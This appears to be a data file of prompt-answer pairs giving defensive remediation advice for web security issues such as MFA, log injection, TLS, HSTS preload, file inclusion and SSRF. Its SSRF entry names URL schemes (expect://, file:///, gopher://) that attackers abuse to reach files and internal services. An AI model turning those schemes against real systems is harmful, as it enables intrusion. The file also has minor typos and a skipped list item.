How to resolve Two factor authentication against username password disclosure?,"Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism – typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)Examples of two/multi factor authentication can be 1. Google authenticator Google Authenticator is an application that implements twostep verification services using the Timebased Onetime Password Algorithm (TOTP) and HMACbased Onetime Password Algorithm 2. Yubikey The YubiKey is a hardware authentication device manufactured by Yubico that supports onetime passwords, public key encryption and authentication, and the Universal 2nd Factor (U2F) protocol[1] developed by the FIDO Alliance (FIDO U2F). It allows users to securely log into their accounts by emitting onetime passwords or using a FIDObased public/private key pair generated by the device"
How to resolve Logging access control decisions?,Verify that all access control decisions can be logged and all failed decisions are logged.
How to resolve High value transactions?,"1 risk based authentication: In Authentication, riskbased authentication is a nonstatic authentication system which takes into account the profile of the agent requesting access to the system to determine the risk profile associated with that transaction. The risk profile is then used to determine the complexity of the challenge. Higher risk profiles leads to stronger challenges, whereas a static username/password may suffice for lowerrisk profiles. Riskbased implementation allows the application to challenge the user for additional credentials only when the risk level is appropriate.2 two factor authentication: Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism – typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)3 Transaction signing: Transaction signing (or digital transaction signing) is the process of calculating a keyed hash function to generate a unique string which can be used to verify both the authenticity and integrity of an online transaction.A keyed hash is a function of the user's private or secret key and the transaction details, such as the transfer to the account number and the transfer amount.To provide a high level of assurance of the authenticity and integrity of the hash it is essential to calculate the hash on a trusted device, such as a separate smart card reader. Calculating a hash on an Internetconnected PC or mobile device such as a mobile telephone/PDA would be counterproductive as malware and attackers can attack these platforms and potentially subvert the signing process itself."
How to resolve Verify that structured data is strongly typed and validated?,"Verify that structured data is strongly typed and validated against a defined schema including allowed characters, length and pattern (e.g. credit card numbers or telephone, or validating that two related fields are reasonable, such as validating suburbs and zip or post codes match"
How to resolve Logging guidelines to access sensitive information?,"Verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required."
How to resolve Log injection?,"You should consider these three controls when implementing logging systems. Design: If at all possible, avoid logging data that came from external inputs. Implementation: Ensure that all log entries are statically created, or if they must record external data that the input is vigorously whitelist checked. Run time: Avoid viewing logs with tools that may interpret control characters in the file, such as commandline shells.Also verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection."
How to resolve Validate the integrity of all security relevant configurations?,Verify that authorised administrators have the capability to verify the integrity of all securityrelevant configurations to ensure that they have not been tampered with.One way to achieve this would be to apply (HIDS) rules. This is a system that monitors important operating system files and can verify whether these files have been edited. Whenever these files are edited a four eyes principle must be applied that checks the integrity of these changes.
How to resolve Trusted repositories?,"When checking if a repository can be trusted look to see if the source is stil maintained, security bugs are being reported and mitigated, if the component is not at the end of life or deprecated.You can also scan the component in your SDLC through OWASP dependency checker to see if there are any known CVEs for this component."
How to resolve Sandboxing malicious code?,"Use the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an iframe enables restrictions on content within an iframe. The following restrictions are Active when the sandbox attribute is set: All markup is treated as being from a unique origin All forms and scripts are disabled. All links are prevented from targeting other browsing contexts All features that trigger automatically are blocked All plugins are disabled It is possible to have a finegrained control over iframe capabilities using the value of the sandbox attribute. In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported. Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header XFrameOptions which supports the deny and sameorigin values. Other solutions like framebusting: ```JavaScript if(window!== window.top) { window.top.location = location; } Only for legacy browser support ```"
How to resolve Client side constraints?,All critical decision making logic must be enforced on the server side out of the scope of a potential attacker. Client side constraints can be easily bypassed.
How to resolve Context sensitive authorization?,"Authorization grants must be granted and enforced outside of the attackers scope. i.e: The user logs into the application, the user id is then stored in a local variable. The application stores grants(privileges/attributes/claims) in the database and for each function the user calls the application gets the grants from the DB using the local variable and checks if the user has access to this function."
How to resolve All access controls must fail securely?,Make sure all the access control systems are thoroughly tested for failing securely before using it in your application. It is common that complete unittest are created especially for this purpose.
How to resolve Password leakage?,"The application should under no circumstances disclose the users current, old and new password plain text. This behavior makes the application susceptible to side channel attacks and make the passwords lose their integrity since they could be compromised by someone looking over another users shoulder to see the password."
How to resolve TLS implementation?,"Verify that TLS is used for all connections (including both external and backend connections) that are authenticated or that involve sensitive data or functions, and does not fall back to insecure or unencrypted protocols. Ensure the strongest alternative is the preferred algorithm.As modern cryptography relies on being computationally expensive to break, specific standards can be set for key sizes that will provide assurance that with today’s technology and understanding, it will take too long to decrypt a message by attempting all possible keys.Therefore, we need to ensure that both the algorithm and the key size are taken into account when selecting an algorithm. Whenever computer power increases the standards for selecting a new alogrithm changes as well."
How to resolve Screen scraping data harvest?,ModSecurity can be used to set up rules to prevent attackers from scraping and harvesting data from the application. The ModSecurity can be set up with thresholds and rate limiting and block IP adresses if they exceed the threshold.
How to resolve Communication between components (low privileges)?,"Communications between components, such as between the application server and the database server should be authenticated using an account with the least necessary privileges."
How to resolve TLS settings are in line with current leading practice?,"There should be structural scans that are done regularly against the applications TLS settings and configurations to check whether the TLS settings are in line with current leading practice.This could be achieved by using the SSLLabs api or the OWASP OSaft project.OSaft is an easy to use tool to show informations about SSL certificate and tests the SSL connection according to a given list of ciphers and various SSL configurations.It's designed to be used by penetration testers, security auditors or server administrators. The idea is to show the important information or the special checks with a simple call of the tool. However, it provides a wide range of options so that it can be used for comprehensive and special checks by experienced people."
How to resolve Data retention policy?,All the sensitive information within the application must be mapped along with the timeframe it is necessary to store this data on the application. For each data set it must be determined how to effectively clear this information from the application.
How to resolve Authenticated data cleared from client storage?,Whenever the user terminates his session all sensitive authenticated information should be cleared from the browser in the client storage. such as:* local storage * Session storage * web SQL * Cache storage * Application cache * etc
How to resolve File inclusion attack II?,"The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible, the application can maintain a white list of files that may be included on the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path.Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml."
How to resolve Sensitive information in code or online repositories?,"Verify that secrets, API keys, and passwords are not included in the source code, or online source code repositories.This could be achieved by manual code reviews and potentially small tools that checks the code for these keys and secrets by means of pattern matching."
How to resolve Identify all components?,Verify that all application components are defined in terms of the business functions and/or security functions they provide.
How to resolve Display concurrent and active sessions?,"The user should be presented with all concurrent and active sessions in his profile/account summary. This way the user can keep track of what is happening and can choose to terminate a session whenever it feels untrusted. Whenever the user shared permission to other applications by means of for example OAuth, than the user should also be presented that have shared permissions along with the type of permissions and activation date."
How to resolve Password change leads to destroying concurrent sessions?,Verify the user is prompted with the option to terminate all other active sessions after a successful change password process.
How to resolve HSTS preload?,"In order to request for HSTS preloading, there are some requirements the application has to be complient with. The submission for the HSTS preloading can be performed on the following url: https://hstspreload.org/Submission RequirementsIf a site sends the preload directive in an HSTS header, it is considered to be requesting inclusion in the preload list and may be submitted via the form on this site.In order to be accepted to the HSTS preload list the site must satisfy the following set of requirements:1. Serve a valid certificate. 2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80. 3. Serve all subdomains over HTTPS. In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists. 5. Serve an HSTS header on the base domain for HTTPS requests: The maxage must be at least eighteen weeks (10886400 seconds). The includeSubDomains directive must be specified. The preload directive must be specified. If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS header (rather than the page it redirects to).Now the following parameter can be added to the HSTS header,maintained by Chrome (and used by Firefox and Safari), then use: StrictTransportSecurity: maxage=31536000; includeSubDomains; preloadThe 'preload' flag indicates the site owner's consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list. CAUTION:Make sure to have a perfectly smooth certification management. Whenever there is no valid certificate, the application can not be downgraded temporarily over HTTP. The failing of the TLS certificate will lead to a DOS since HSTS does not allow the application to be visited over HTTP"
How to resolve Integrity check and authorised modification?,Verify all access controls are implemented properly in order to prevent a user access data/functions which he was not intended to use.
How to resolve Unauthorised access and modification?,Verify all access controls are implemented properly in order to prevent a user access data/functions which he was not intended to use.
How to resolve Identify and use only require functions if using components?,The best approach in minimizing the possible security issues that can arise in application components and identify the required functions and disable or remove those that are not needed by the application business functions or security functions. This way there is a lower risk when using those components and easier to maintain and protecting the application.
How to resolve Centralized the mechanisms for protecting resources and the access?,Immplement a centralized mechanism where all the different types of resources and grating access to these resources (including libraries that call external authorization services) are located. This way it's easier to maintain and the lower the complexity.
How to resolve Third party components?,"Verify that all components that are not part of the application but that the application relies on to operate are defined in terms of the functions, and/or security functions, they provide."
How to resolve Policy for processing sensitive data?,"Identify the list of sensitive data that is being processed by the application.Establish, maintain, and disseminate a security policy for processing and storing sensitive data. If information should be encrypted, separated in another database, etc. If exist, follow the appropriate standard."
How to resolve Server side request forgery?,"Disable unused URL schemas which are dangerous like expect://, file:///, ftp://, gopher://. Proper whitelisting of domain or IP address which you need to access to. Response received from the internal server should not be shown to the attacker. Some services like Memcached, Redis, Elasticsearch and MongoDB do not require authentication by default, so we need to enable authentication for these services."